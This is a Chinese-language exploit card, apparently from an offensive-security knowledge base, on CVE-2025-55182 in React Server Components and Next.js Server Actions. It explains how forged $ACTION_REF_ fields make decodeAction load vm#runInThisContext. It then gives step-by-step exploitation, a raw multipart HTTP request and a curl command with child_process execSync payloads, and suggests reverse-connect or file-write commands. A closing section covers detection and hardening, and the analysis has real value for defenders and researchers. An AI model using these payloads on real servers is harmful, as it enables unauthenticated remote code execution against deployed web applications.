---
id: web-nodejs-deserialization-react-actions-action-ref-vm-rce
title: React Server Components CVE-2025-55182：decodeAction 伪造 $ACTION_REF_ 服务器引用经 vm#runInThisContext 执行命令
type: scenario
domain: web
path: web/nodejs/deserialization
technique: react-server-actions-action-ref-server-reference-rce
aliases:
- CVE-2025-55182 Server Actions 利用
- React2Shell decodeAction
- $ACTION_REF_ 伪造 action
- $ACTION_ID_ 任意模块加载
- vm#runInThisContext RCE
- Next.js Server Actions RCE
tags:
- nodejs
- react
- nextjs
- server-actions
- flight-protocol
- deserialization
- vm
- rce
- cve-2025-55182
cve:
- CVE-2025-55182
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: React Server Components 19.0.0、19.1.0、19.1.1、19.2.0（react-server-dom-parcel、react-server-dom-turbopack、react-server-dom-webpack）；原文称影响所有 Next.js 15/16 项目
verification:
  verified_by: verifier-V51
  verified_at: '2026-11-05T09:06:56+08:00'
  notes: 已对照原文与3张图核对：CVE-2025-55182、CVSS 10.0、React Server Components 19.0.0/19.1.0/19.1.1/19.2.0 与三个 react-server-dom-* 包；decodeAction 对 $ACTION_REF_/$ACTION_ID_ 的 loadServerReference 逻辑、vm#runInThisContext + process.mainModule.require(child_process).execSync 载荷均与卡一致。原文未给完整 HTTP 报文/回显（同批 90753 文章有完整 multipart 与 dir 回显，卡未引用），卡已注明边界。未验证点：未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

CVE-2025-55182 的 Server Actions 利用路径：React 的 `decodeAction` 会按客户端提交的 `$ACTION_ID_*`/`$ACTION_REF_*` 字段从 `serverManifest` 动态加载模块与函数，并把客户端伪造的 bound 参数绑定上去；攻击者构造 `id: "vm#runInThisContext"`、`bound: ["process.mainModule.require('child_process').execSync(...)"]`，即可让服务端把恶意字符串当作 `vm.runInThisContext` 的参数执行，未认证实现 RCE。

## 原理

- 背景：React Server Components（RSC）+ Server Actions 把客户端表单提交映射到服务端函数。客户端提交的 FormData 中，`$ACTION_ID_<id>` 与 `$ACTION_REF_<n>` 字段被 `decodeAction(body, serverManifest)` 解析。
- 代码逻辑（原文节选）：遍历 FormData，若 key 以 `$ACTION_REF_` 开头，则 `value = "$ACTION_" + key.slice(12) + ":"`，再 `decodeBoundActionMetaData(body, serverManifest, value)` 取出 `{id, bound}`，最后 `loadServerReference(serverManifest, value.id, value.bound)`；若 key 以 `$ACTION_ID_` 开头，则直接 `value = key.slice(11)` 后 `loadServerReference(serverManifest, value, null)`。
- 缺陷一：`$ACTION_REF_` 本意是引用“已有 action 实例”，但客户端可以自己拼出 `$ACTION_REF_999` 与 `$ACTION_999:0`、`$ACTION_999:1` 等字段，让服务端创建一个带攻击者指定 `id` 与 `bound` 参数的新 action 引用——即客户端完全控制“加载哪个服务器函数、绑定什么参数”。
- 缺陷二：`loadServerReference` 按 `serverManifest` 中的模块名/导出名动态 `require()`，而 manifest 里包含 `vm` 等可被 RSC Bundler 标记为可导入的模块；攻击者把 `id` 设为 `vm#runInThisContext` 即可选中 `vm.runInThisContext`。
- 为什么能执行：`runInThisContext` 在当前上下文执行字符串，且可通过 `global.process.mainModule.require('child_process')` 拿到 `child_process` 执行系统命令。`decodeAction` 返回的 action 被绑定 FormData 后，服务端按“正常业务 action”调用 `actionFn({...})`，从而触发 `vm.runInThisContext(攻击者字符串)`。
- 为什么未认证：漏洞位于 Server Actions 的请求解析/分发层，在业务鉴权之前；任何能向 Server Actions 端点发送 multipart 请求的客户端都可触发。

## 触发条件

- 目标为受影响版本的 React Server Components（19.0.0/19.1.0/19.1.1/19.2.0）或使用其的 Next.js 15/16 应用。
- 应用启用了 Server Actions，且 Server Actions 端点可被未认证访问。
- `serverManifest` 中存在可被 `loadServerReference` 加载的危险模块/方法（如 `vm#runInThisContext`），或存在其他可达 `Function`/`eval`/`require` 的导出。
- 服务端未部署针对 `$ACTION_REF_`/`$ACTION_ID_` 伪造的修复或 WAF 拦截。

## 利用步骤

1. 确认目标为 React 19/Next.js 15/16，并找到接受 Server Actions 的端点（表单 action 提交对应的 URL，通常为当前页面路径，`Next-Action` 头或 multipart 字段）。
2. 构造 multipart FormData，加入伪造的 action 引用字段：`$ACTION_REF_999=1`，以及 `$ACTION_999:0=...` 等 bound 参数。
3. 让 `decodeBoundActionMetaData` 解析出 `id` 为 `vm#runInThisContext`，`bound` 为包含恶意代码的数组，例如 `["global.process.mainModule.require('child_process').execSync('id').toString()"]`。
4. 发送请求；服务端 `decodeAction` 加载 `vm.runInThisContext` 并绑定参数，随后按正常 action 调用执行恶意代码。
5. 将 `id` 替换为计算器/回连/写文件命令验证；也可换其他 manifest 内可达的危险函数（`Function`、`eval`、`require` 包装器等）。

## PoC

原文给出的字段形态与核心 payload（未给出完整原始 HTTP 报文）：

```text
# FormData 字段（$ACTION_REF_ 伪造 action 实例）
$ACTION_REF_999=1
$ACTION_999:0=hello
$ACTION_999:1=world
```

```text
# 解析后得到的服务器引用
{
  id: "vm#runInThisContext",
  bound: [
    "global.process.mainModule.require('child_process').execSync('calc').toString()"
  ]
}
```

```javascript
// 服务端最终等价执行
vm.runInThisContext("global.process.mainModule.require('child_process').execSync('calc')")
```

```http
POST /<server-action-endpoint> HTTP/1.1
Host: target.example
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="$ACTION_REF_999"

1
------boundary
Content-Disposition: form-data; name="$ACTION_999:0"

global.process.mainModule.require('child_process').execSync('id').toString()
------boundary--
```

另一种等价形态是把元数据 JSON 放进 `$ACTION_<n>:<m>` 字段（bound 可多参数）：

```bash
curl -X POST 'http://target.example/<server-action-endpoint>' \
  -F '$ACTION_REF_999=' \
  -F '$ACTION_999:0={"id":"vm#runInThisContext","bound":["global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()"]}'
```

```text
# 预期：服务端执行命令；文章以 calc 演示，实际可用 id/curl/写文件验证。
# 字段 id 的具体编码方式（$ACTION_REF_ 索引与 $ACTION_<id>:<n> 的对应）需按目标 React 版本调试。
```

## 变体与关联

- 变体：`$ACTION_ID_*` 直接指定模块导出，若 manifest 暴露危险函数，可省略 bound 伪造步骤。
- 变体：把 `vm#runInThisContext` 换成 `child_process#execSync` 等直接可达导出，或换成 `Function` 构造器路径。
- 关联：[[web-nodejs-deserialization-react-flight-chunk-proto-function-rce]]（同一 CVE 的另一条 Flight Chunk/`$B` 原型链利用链；本卡走 Server Actions `decodeAction` 路径，触发点与 PoC 不同）；[[web-nodejs-deserialization-qwik-server-qrl-rce]]（框架协议反序列化 RCE 同类）。
- 边界：文章未附完整可执行 HTTP 报文与回显，字段编码细节需按目标版本验证；但 CVE 与公开 PoC 已确认 RCE 成立，故 confidence 定为 high。修复版本以官方公告为准（原文只给出受影响版本，未列具体补丁号）。

## 检测与防御

- 检测：审计 multipart 请求中的 `$ACTION_REF_`、`$ACTION_ID_`、`$ACTION_<id>:` 字段组合；关注 `id` 值包含 `vm#`、`child_process`、`Function`、`__proto__` 等危险引用；监控 Node 进程异常派生 `sh`/`cmd`/`calc` 子进程。
- 修复：升级 React/Next.js 到官方修复版本（覆盖 19.0.0/19.1.0/19.1.1/19.2.0 对应补丁）；升级 `react-server-dom-parcel/turbopack/webpack`。
- 加固：Server Actions 端点增加认证与 CSRF 防护；对 `serverManifest` 做导出白名单，禁止暴露 `vm`、`child_process` 等危险模块；WAF 拦截伪造 `$ACTION_REF_`/`$ACTION_ID_` 的请求；Node 进程最小权限、容器只读并限制出站。
